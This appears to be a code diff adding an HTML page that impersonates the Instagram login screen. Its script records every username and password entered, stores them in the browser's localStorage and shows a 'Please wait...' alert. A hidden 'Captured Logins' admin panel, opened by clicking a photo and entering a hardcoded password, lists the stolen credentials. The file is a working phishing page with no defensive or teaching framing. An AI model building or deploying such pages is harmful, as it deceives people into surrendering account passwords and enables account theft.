@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0c1014;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .left-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .left-section img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .left-section img:hover {
+            transform: scale(1.02);
+        }
+
+        .right-section {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .title-text {
+            color: white;
+            font-size: 52px;
+            margin-bottom: 30px;
+            font-family: 'Billabong', cursive;
+        }
+
+        .input-box {
+            width: 350px;
+            height: 50px;
+            padding: 10px;
+            background-color: #121212;
+            border: 1px solid #363636;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+        }
+
+        .input-box:focus {
+            outline: none;
+            border-color: #555;
+        }
+
+        .input-box::placeholder {
+            color: #8e8e8e;
+        }
+
+        .submit-button {
+            width: 350px;
+            height: 50px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        .submit-button:hover {
+            background-color: #1877f2;
+        }
+
+        .submit-button:active {
+            background-color: #005dbf;
+        }
+
+        .divider {
+            width: 350px;
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #363636;
+        }
+
+        .divider-text {
+            color: #8e8e8e;
+            padding: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+
+        .facebook-icon {
+            width: 20px;
+            height: 20px;
+            background-color: #385185;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            color: #a8a8a8;
+            font-size: 12px;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+
+        .forgot-password:hover {
+            color: white;
+        }
+
+        .signup-section {
+            color: #a8a8a8;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            color: white;
+        }
+
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .admin-panel.active {
+            display: flex;
+        }
+
+        .admin-content {
+            background-color: #1a1a1a;
+            padding: 40px;
+            border-radius: 10px;
+            width: 500px;
+            max-width: 90%;
+            border: 1px solid #363636;
+        }
+
+        .admin-header {
+            color: #0095f6;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .admin-info {
+            color: #a8a8a8;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .login-entry {
+            background-color: #121212;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #363636;
+        }
+
+        .login-entry p {
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+
+        .login-entry .timestamp {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .close-admin {
+            background-color: #363636;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .close-admin:hover {
+            background-color: #4a4a4a;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-content">
+            <h2 class="admin-header">🔒 Admin Panel - Captured Logins</h2>
+            <div class="admin-info" id="loginList">
+                <p style="text-align: center; color: #8e8e8e;">No login attempts captured yet.</p>
+            </div>
+            <button class="close-admin" onclick="closeAdmin()">Close Panel</button>
+        </div>
+    </div>
+
+    <div class="left-section">
+        <img src="photo.png" alt="Photo" onclick="openAdmin()">
+    </div>
+    
+    <div class="right-section">
+        <h1 class="title-text">Instagram</h1>
+        
+        <input type="text" class="input-box" id="usernameInput" placeholder="Phone number, username, or email">
+        
+        <input type="password" class="input-box" id="passwordInput" placeholder="Password">
+        
+        <button class="submit-button" onclick="captureLogin()">Log in</button>
+
+        <div class="divider">
+            <span class="divider-text">OR</span>
+        </div>
+
+        <div class="facebook-login">
+            <div class="facebook-icon">f</div>
+            <span>Log in with Facebook</span>
+        </div>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+
+        <div class="signup-section">
+            Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        let loginAttempts = [];
+
+        // Load saved login attempts when page loads
+        function loadSavedLogins() {
+            const saved = localStorage.getItem('capturedLogins');
+            if (saved) {
+                loginAttempts = JSON.parse(saved);
+            }
+        }
+
+        // Save login attempts to localStorage
+        function saveLogins() {
+            localStorage.setItem('capturedLogins', JSON.stringify(loginAttempts));
+        }
+
+        // Load saved logins on page load
+        loadSavedLogins();
+
+        function captureLogin() {
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            if (username && password) {
+                const timestamp = new Date().toLocaleString();
+                loginAttempts.push({
+                    username: username,
+                    password: password,
+                    timestamp: timestamp
+                });
+
+                // Save to localStorage
+                saveLogins();
+
+                // Clear the inputs
+                document.getElementById('usernameInput').value = '';
+                document.getElementById('passwordInput').value = '';
+
+                // Show a loading effect (optional)
+                alert('Please wait...');
+            }
+        }
+
+        function openAdmin() {
+            const password = prompt('Enter admin password:');
+            if (password === '5394') {
+                displayLogins();
+                document.getElementById('adminPanel').classList.add('active');
+            } else if (password !== null) {
+                alert('Incorrect password!');
+            }
+        }
+
+        function displayLogins() {
+            const loginList = document.getElementById('loginList');
+            
+            if (loginAttempts.length === 0) {
+                loginList.innerHTML = '<p style="text-align: center; color: #8e8e8e;">No login attempts captured yet.</p>';
+            } else {
+                loginList.innerHTML = '';
+                loginAttempts.forEach((attempt, index) => {
+                    const entry = document.createElement('div');
+                    entry.className = 'login-entry';
+                    entry.innerHTML = `
+                        <p><strong>Entry #${index + 1}</strong></p>
+                        <p><strong>Username:</strong> ${attempt.username}</p>
+                        <p><strong>Password:</strong> ${attempt.password}</p>
+                        <p class="timestamp">${attempt.timestamp}</p>
+                    `;
+                    loginList.appendChild(entry);
+                });
+            }
+        }
+
+        function closeAdmin() {
+            document.getElementById('adminPanel').classList.remove('active');
+        }
+    </script>
+</body>
+</html>
